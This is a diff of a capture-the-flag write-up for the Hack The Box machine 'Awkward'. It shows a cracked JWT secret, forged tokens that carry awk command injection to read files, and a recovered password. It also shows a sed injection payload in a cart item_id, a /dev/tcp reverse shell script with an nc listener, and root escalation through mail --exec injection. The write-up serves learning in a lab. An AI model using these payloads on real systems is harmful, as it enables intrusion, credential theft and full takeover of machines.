@@ -155,6 +155,8 @@ http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fhat-valley.htb:3002%22
 
 Navigate to the /api/all-leave section to see the vulnerable code
 
+![image](https://user-images.githubusercontent.com/105310322/199106995-e806dd92-4bfb-4fd4-9b17-1fcfc9be9998.png)
+
 
 ```js
 app.get('/api/all-leave', (req, res) => {
@@ -233,6 +235,23 @@ app.get('/api/all-leave', (req, res) => {
 })
 ```
 
+This portion ``` exec("awk '/" + user + "/' /var/www/private/leave_requests.csv"``` takes the user field of the JWT token and executes awk on it. We can also see in the code that alot of special characters will not work and is why my shells and command injections were not working. (Same bad chars that patchted the sumbit leave form)
+
+GTFO bins has a simple way to read files with awk
+
+https://gtfobins.github.io/gtfobins/awk/
+
+
+But first remember that JWT cookie I had talked about. We need to decrypt it's secret key so we can sign it with a new "user" command.
+
+There are multiple ways to do this but I used this one.
+
+https://github.com/ticarpi/jwt_tool
+
+Install it and then run it against rockyou to get back the secret 123beany123
+
+Note: Earlier on I tried this password and chris123 against the store webpage and I had no luck.
+
 ```console
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -d /usr/share/wordlists/rockyou.txt -C 
 
@@ -266,11 +285,9 @@ You can tamper/fuzz the token contents (-T/-I) and sign it using:
 python3 jwt_tool.py [options here] -S hs256 -p "123beany123"
 ```
 
-https://gtfobins.github.io/gtfobins/awk/
+Now that we have cracked the key we need to edit in our own "user"
 
-
-
-
+For the user field I changed it to /etc/passwd to test it out.
 
 ```
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
@@ -333,6 +350,10 @@ jwttool_e5e6ada6ba82ff68d252d8f8f1b3bc46 - Tampered token - HMAC Signing:
 [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICcvIiwiaWF0IjoxNjY2OTA0MTAwfQ.4yuT_tZes_lWGcYTN1Qn0El-qex9QoPTYBZNtz10UvE
 ```
 
+Now copy and paste that cookie into burp or curl and read the output.
+
+We have confirmed it works and can read files that we know exist.
+
 ```
 GET /api/all-leave HTTP/1.1
 Host: hat-valley.htb
@@ -347,8 +368,6 @@ Content-Length: 53
 
 If-None-Match: W/"8c-rIHXkvsSLlUvGPdve0hY79VoWd0"
 ```
-
-
 ```
 HTTP/1.1 200 OK
 Server: nginx/1.18.0 (Ubuntu)
@@ -412,31 +431,11 @@ postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
 mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
 _laurel:x:999:999::/var/log/laurel:/bin/false
-Subject: Leave Request: /'
-To: <'a@awkward>,<christine@awkward>
-User-Agent: mail (GNU Mailutils 3.14)
-Date: Sat, 29 Oct 2022 08:21:19 +1100
-
-You have a new leave request to review!
-/' /etc/passwd 'a,/' /etc/passwd 'a,id,id,Pending
-.
-Subject: Leave Request: /'
-To: <'a@awkward>,<christine@awkward>
-User-Agent: mail (GNU Mailutils 3.14)
-Date: Sat, 29 Oct 2022 08:21:48 +1100
-
-You have a new leave request to review!
-/' /etc/passwd 'a,id,13/10/2022,29/10/2022,Pending
-.
-Subject: Leave Request: '/
-To: christine
-User-Agent: mail (GNU Mailutils 3.14)
-Date: Sat, 29 Oct 2022 08:28:07 +1100
-
-You have a new leave request to review!
-'/ /etc/passwd /',/' /etc/passwd 'a,id,id,Pending
-.
 ```
+
+I tried a few other common files and was really hoping for ssh keys but neither christine or bean had them.
+
+I finally got some headway with /home/bean/.bashrc
 
 ```console
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
@@ -498,6 +497,9 @@ Please select a field number:
 jwttool_385297dc9babe05c25f3eae1c3f4e8bd - Tampered token - HMAC Signing:
 [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnLyIsImlhdCI6MTY2NjkwNDEwMH0.Us1Hs3HRZnruqhDal7Ppc7tajBW8cI6-2jJLBeWxD4c
 ```
+
+The file hints at another file ```/home/bean/Documents/backup_home.sh``` so lets check that one.
+
 
 ```
 HTTP/1.1 200 OK
@@ -632,6 +634,7 @@ if ! shopt -oq posix; then
 fi
 ```
 
+Keep firing up jwt_tool and editing the user with your commands.
 
 
 ```console
@@ -695,6 +698,7 @@ jwttool_add6b83edf43d4c9ac97d032e4226f98 - Tampered token - HMAC Signing:
 [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICcvIiwiaWF0IjoxNjY2OTA0MTAwfQ.F1hddTOC6QI1RcDOVL-x6-jPPkr8ZI74ELc-qV0hTP8
 ```
 
+This time we get another file that is referenced but we won't be able to read it since it is zipped. Instead we need to copy the output to a zip file.
 
 ```
 HTTP/1.1 200 OK
@@ -717,7 +721,9 @@ tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
 rm -r /home/bean/Documents/backup_tmp
 ```
 
+Last time using Jwt_tool :)
 
+Add the zip file to be read inside your user as the command.
 
 ```console
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
@@ -780,6 +786,7 @@ jwttool_902be2192ed541c7428b87be94c7055f - Tampered token - HMAC Signing:
 [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NjkwNDEwMH0.JFJO7-Gmt0qknUmR_k6dPHu_geyocouMIy8bbG69S-Q
 ```
 
+Now using curl we can output the data to our own zip file.
 
 ```
 └─$ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NjkwNDEwMH0.JFJO7-Gmt0qknUmR_k6dPHu_geyocouMIy8bbG69S-Q" --output bean_backup_final.zip
@@ -790,6 +797,8 @@ jwttool_902be2192ed541c7428b87be94c7055f - Tampered token - HMAC Signing:
 
 After downloading go to your file manager and open the zip and then extract the contents. You should get an error but the files will still get extracted.
 
+
+His entire home directory is in this backup and after looking through all of them I found a password ```014mrbeanrules!#P```
 
 ```console
 └─$ cat bean/bean_backup_final_FILES/bean_backup/.config/xpad/content-DS1ZS1 
@@ -808,6 +817,8 @@ https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
 
 boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
 ````
+
+Now we can finally log into the victims computer!
 
 ```console
 └─$ ssh bean@hat-valley.htb 
@@ -830,14 +841,32 @@ bean@awkward:~$
 bean@awkward:~$ cat user.txt
 c14*****************************
 ```
-We learn that the username for nginx is admin and since bean.hill is the admin we can use his password to login.
+
+From messing with the store webpage earlier I knew that it was running Nginx so I decided to check their configuration files.
+
+Note: I used Wappalyzer to get this info. It's a firefox extension. Pretty helpful for finding what is running on a webpage.
+
+In this file is a username admin and a hash. I was unable to crack the hash but I did not need to. All I needed was confirmation on the username for nginx.
 
 ```console
 bean@awkward:/tmp$ cat /etc/nginx/conf.d/.htpasswd 
 admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
 ```
 
-Inside the Readme file we get some hints about replacing files in the cart and to try it out.
+Navigate the to store.hat-valley.htb webpage and input admin as username and since bean hill is the system admin we are going to use his password.
+
+admin:014mrbeanrules!#P
+
+![image](https://user-images.githubusercontent.com/105310322/199110272-3e1e0947-03f6-464a-a3d5-a6c71d482a60.png)
+
+We are presented with the store page but without knowledge on how the page runs we will not get far.
+
+
+
+
+
+
+Inside ```/var/www/store/Readme.md``` file we get some hints about replacing files in the cart and to try it out.
 
 ```console
 bean@awkward:/tmp$ cat /var/www/store/README.md 
@@ -860,6 +889,10 @@ To test cart functionality, create a new cart file and add items to it, and see 
 ```
 
 Now in the cart_actions file we find that upon deleting an item from the cart a sed command is ran on the itemID. We an abuse this sed command and paramater to give us RCE.
+
+https://gtfobins.github.io/gtfobins/sed/
+
+This portion of the php code ```system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");```
 
 ```php
 bean@awkward:/tmp$ cat /var/www/store/cart_actions.php 
@@ -972,26 +1005,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' &&
 ?>
 ```
 
+1. Copy and paste the contents of ```/var/www/store/product_details/1.txt``` into your own file and rename the file to your user id. (User ID is found by capturing a store request in burp)
 
-After capturing the request change the ```item=``` to the one below
+2. Edit the file item_id parameter to ```1' -e "1e /tmp/shell.sh" /tmp/shell.sh '```
+
+3. Copy this file to /var/www/store/cart/
 
 ```console
 bean@awkward:/var/www/store/cart$ cat c007-4b53-30b-e531 
 ***Hat Valley Product***
 item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
 ```
+2. Create a bash script to run a reverse shell and set up your listener.(You can use others)
+
 ```console
 bean@awkward:/tmp$ cat shell.sh 
 #!/bin/bash
 sh -i >& /dev/tcp/10.10.16.6/1234 0>&1
 ```
 
-```console
-2022/11/01 07:10:01 CMD: UID=0    PID=85429  | /bin/bash /root/scripts/notify.sh 
-2022/11/01 07:10:01 CMD: UID=0    PID=85433  | mail -s Leave Request: bean.hill christine 
-2022/11/01 07:10:01 CMD: UID=0    PID=85436  | /usr/sbin/sendmail -oi -f root@awkward -t 
-2022/11/01 07:10:01 CMD: UID=0    PID=85435  | local -t unix 
-```
+
+4. Capture the request to remove the item from the cart and change the ```item_id=``` to the one below
 
 ```
 POST /cart_actions.php HTTP/1.1
@@ -1010,7 +1044,7 @@ Referer: http://store.hat-valley.htb/cart.php
 
 item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&user=c007-4b53-30b-e531&action=delete_item
 ```
-
+And you get a reverse shell!
 
 ```console
 └─$ nc -lvnp 1234          
@@ -1020,12 +1054,32 @@ connect to [10.10.16.6] from (UNKNOWN) [10.129.228.81] 58084
 sh: 0: can't access tty; job control turned off
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+Now that we are www-data we can finally look into ```/var/www/private``` which has nothing but leave_requests.csv :/
+
+However running pspy on the victim actually reveals that it is accessing this file with the mail command.
+
+Note: Back when I was doing enumeration as bean I noticed that the /private folder was only accessible by christine or www-data so I figured 1 of these users would be my way forward.
+
+```console
+2022/11/01 07:10:01 CMD: UID=0    PID=85429  | /bin/bash /root/scripts/notify.sh 
+2022/11/01 07:10:01 CMD: UID=0    PID=85433  | mail -s Leave Request: bean.hill christine 
+2022/11/01 07:10:01 CMD: UID=0    PID=85436  | /usr/sbin/sendmail -oi -f root@awkward -t 
+2022/11/01 07:10:01 CMD: UID=0    PID=85435  | local -t unix 
+```
+
+Here is the simple part of the challenge. All we need to do is edit the leave_requests.csv file with our malicious mail command and gain root.
+
+
 https://gtfobins.github.io/gtfobins/mail/
 
+As www-data replace the file with the following command to add the suid bit to /bin/bash. After the mail is sent the suid bit will be added.
 
 ```
 www-data@awkward:~/private$ echo '" --exec=!/tmp/suid.sh "' > leave_requests.csv
 ```
+
+Confirm the suid bit change and run bash -p for root!
 
 ```console
 bean@awkward:/tmp$ ls -la /bin/bash
@@ -1036,3 +1090,7 @@ uid=1001(bean) gid=1001(bean) euid=0(root) groups=1001(bean)
 bash-5.1# cat /root/root.txt
 795*****************************
 ```
+
+In the beginning I had a little frustration with feroxbuster and other tools not working likely due to the nginx proxy server that was running. Overall not a bad challenge. Alot of manual enumeration but I am getting better at that and is important to know how to do.
+
+GG!
